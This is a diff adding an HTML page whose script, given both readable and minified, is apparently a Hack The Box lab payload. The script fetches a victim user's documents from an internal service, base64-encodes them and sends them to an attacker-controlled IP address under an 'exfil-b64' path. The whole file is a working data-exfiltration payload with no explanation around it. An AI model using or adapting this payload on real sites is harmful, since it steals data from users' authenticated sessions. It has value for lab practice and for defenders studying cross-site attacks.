@@ -1,0 +1,22 @@
+<html>
+  <body>
+    <script>
+      function send(url, callback) {
+        var x = new XMLHttpRequest();
+        x.onreadystatechange = function () {
+          if (x.readyState == 4) {
+            if (callback) callback(x.responseText);
+          }
+        };
+        x.open("GET", url);
+        x.send();
+      }
+      send("http://consumer.oouch.htb:5000/documents", function (response) {
+        b64 = btoa(response);
+        send("http://10.10.14.4/exfil-b64/documents?f=" + b64);
+      });
+    </script>
+    <!-- minified -->
+    <SCRIPT>function send(e,t){var n=new XMLHttpRequest;n.onreadystatechange=function(){4==n.readyState&&t&&t(n.responseText)},n.open("GET",e),n.send()}send("http://consumer.oouch.htb:5000/documents",function(e){b64=btoa(e),send("http://10.10.14.4/exfil-b64/documents?f="+b64)})</SCRIPT>
+  </body>
+</html>
